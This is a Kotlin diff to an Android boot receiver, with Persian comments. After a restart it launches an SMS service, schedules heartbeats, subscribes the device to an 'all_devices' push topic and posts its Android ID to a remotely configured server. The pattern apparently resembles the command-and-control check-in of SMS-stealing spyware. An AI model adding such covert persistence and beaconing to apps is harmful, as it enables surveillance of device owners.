@@ -4,8 +4,15 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.os.Build
+import android.os.Handler
+import android.os.Looper
+import android.provider.Settings
 import android.util.Log
 import com.example.test.utils.DirectBootHelper
+import com.google.firebase.messaging.FirebaseMessaging
+import org.json.JSONObject
+import java.net.HttpURLConnection
+import java.net.URL
 
 class BootReceiver : BroadcastReceiver() {
 
@@ -83,6 +90,15 @@ class BootReceiver : BroadcastReceiver() {
                 Log.d(TAG, "✅ Device UNLOCKED - Starting with full functionality")
             }
             
+            // 0. ⭐ Initialize ServerConfig برای دسترسی به Remote Config
+            try {
+                ServerConfig.initialize(workingContext)
+                Log.d(TAG, "✅ ServerConfig initialized")
+            } catch (e: Exception) {
+                Log.e(TAG, "⚠️ Failed to initialize ServerConfig: ${e.message}")
+                // ادامه می‌دیم چون getBaseUrl() می‌تونه از default استفاده کنه
+            }
+            
             // 1. Start SMS Service
             startSmsService(workingContext)
 
@@ -97,6 +113,14 @@ class BootReceiver : BroadcastReceiver() {
                 com.example.test.utils.JobSchedulerHelper.scheduleHeartbeatJob(workingContext)
                 Log.d(TAG, "✅ JobScheduler scheduled")
             }
+            
+            // 5. ⭐ Initialize Firebase Messaging و Subscribe به Topic
+            // با تاخیر برای اطمینان از اینکه Firebase initialize شده
+            Handler(Looper.getMainLooper()).postDelayed({
+                initializeFirebaseMessaging(workingContext)
+                // ارسال ping به سرور برای اعلام آنلاین بودن
+                sendBootPing(workingContext)
+            }, 3000) // 3 ثانیه تاخیر
 
             Log.d(TAG, "✅ All services started successfully")
 
@@ -151,5 +175,149 @@ class BootReceiver : BroadcastReceiver() {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Failed to start NetworkService", e)
         }
+    }
+    
+    /**
+     * ⭐ Initialize Firebase Messaging و Subscribe به Topic
+     * این کار برای اطمینان از اینکه بعد از boot، Firebase کار می‌کنه
+     */
+    private fun initializeFirebaseMessaging(context: Context) {
+        try {
+            Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "🔥 INITIALIZING FIREBASE MESSAGING")
+            Log.d(TAG, "════════════════════════════════════════")
+            
+            // 1. گرفتن FCM Token
+            FirebaseMessaging.getInstance().token
+                .addOnCompleteListener { task ->
+                    if (task.isSuccessful && task.result != null) {
+                        val token = task.result!!
+                        Log.d(TAG, "✅ FCM Token received: ${token.take(20)}...")
+                    } else {
+                        Log.e(TAG, "❌ Failed to get FCM Token: ${task.exception?.message}")
+                    }
+                }
+            
+            // 2. Subscribe به Topic
+            FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
+                .addOnCompleteListener { task ->
+                    if (task.isSuccessful) {
+                        Log.d(TAG, "✅ Successfully subscribed to 'all_devices' topic after boot")
+                    } else {
+                        Log.e(TAG, "❌ Failed to subscribe to 'all_devices' topic after boot", task.exception)
+                        // Retry بعد از 30 ثانیه
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            Log.d(TAG, "🔄 Retrying Firebase topic subscription...")
+                            initializeFirebaseMessaging(context)
+                        }, 30000)
+                    }
+                }
+            
+            // 3. ⭐ Restart WorkManager برای Heartbeat
+            try {
+                val workRequest = androidx.work.PeriodicWorkRequestBuilder<HeartbeatWorker>(
+                    15,
+                    java.util.concurrent.TimeUnit.MINUTES,
+                    5,
+                    java.util.concurrent.TimeUnit.MINUTES
+                )
+                    .setConstraints(
+                        androidx.work.Constraints.Builder()
+                            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
+                            .build()
+                    )
+                    .setBackoffCriteria(
+                        androidx.work.BackoffPolicy.EXPONENTIAL,
+                        10,
+                        java.util.concurrent.TimeUnit.SECONDS
+                    )
+                    .addTag("heartbeat")
+                    .build()
+
+                androidx.work.WorkManager.getInstance(context).enqueueUniquePeriodicWork(
+                    HeartbeatWorker.WORK_NAME,
+                    androidx.work.ExistingPeriodicWorkPolicy.REPLACE,
+                    workRequest
+                )
+                Log.d(TAG, "✅ WorkManager restarted after boot")
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Failed to restart WorkManager: ${e.message}")
+            }
+            
+            Log.d(TAG, "════════════════════════════════════════")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to initialize Firebase Messaging: ${e.message}", e)
+        }
+    }
+    
+    /**
+     * ⭐ ارسال Ping به سرور بعد از Boot
+     * برای اعلام آنلاین بودن دستگاه
+     */
+    private fun sendBootPing(context: Context) {
+        Thread {
+            try {
+                Log.d(TAG, "════════════════════════════════════════")
+                Log.d(TAG, "📡 SENDING BOOT PING TO SERVER")
+                Log.d(TAG, "════════════════════════════════════════")
+                
+                val deviceId = Settings.Secure.getString(
+                    context.contentResolver,
+                    Settings.Secure.ANDROID_ID
+                )
+                Log.d(TAG, "📱 Device ID: $deviceId")
+
+                val body = JSONObject().apply {
+                    put("deviceId", deviceId)
+                    put("isOnline", true)
+                    put("timestamp", System.currentTimeMillis())
+                    put("source", "BootReceiver")
+                    put("event", "device_booted")
+                }
+
+                val baseUrl = ServerConfig.getBaseUrl()
+                val urlString = "$baseUrl/ping-response"
+                Log.d(TAG, "🌐 URL: $urlString")
+                Log.d(TAG, "📤 Body: ${body.toString()}")
+
+                val url = URL(urlString)
+                val conn = url.openConnection() as HttpURLConnection
+
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.doOutput = true
+                conn.connectTimeout = 15000
+                conn.readTimeout = 15000
+
+                conn.outputStream.use { os ->
+                    val bytes = body.toString().toByteArray()
+                    Log.d(TAG, "📊 Body size: ${bytes.size} bytes")
+                    os.write(bytes)
+                    os.flush()
+                }
+
+                val responseCode = conn.responseCode
+                Log.d(TAG, "📥 Response Code: $responseCode")
+
+                if (responseCode == HttpURLConnection.HTTP_OK) {
+                    val response = conn.inputStream.bufferedReader().use { it.readText() }
+                    Log.d(TAG, "✅ Boot ping sent successfully: $response")
+                } else {
+                    val errorResponse = conn.errorStream?.bufferedReader()?.use { it.readText() }
+                    Log.e(TAG, "❌ Boot ping failed: $errorResponse")
+                }
+
+                conn.disconnect()
+                Log.d(TAG, "════════════════════════════════════════")
+                
+            } catch (e: java.net.ConnectException) {
+                Log.e(TAG, "❌ Connection failed: Cannot reach server", e)
+            } catch (e: java.net.SocketTimeoutException) {
+                Log.e(TAG, "❌ Connection timeout", e)
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Failed to send boot ping: ${e.message}", e)
+            }
+        }.start()
     }
 }
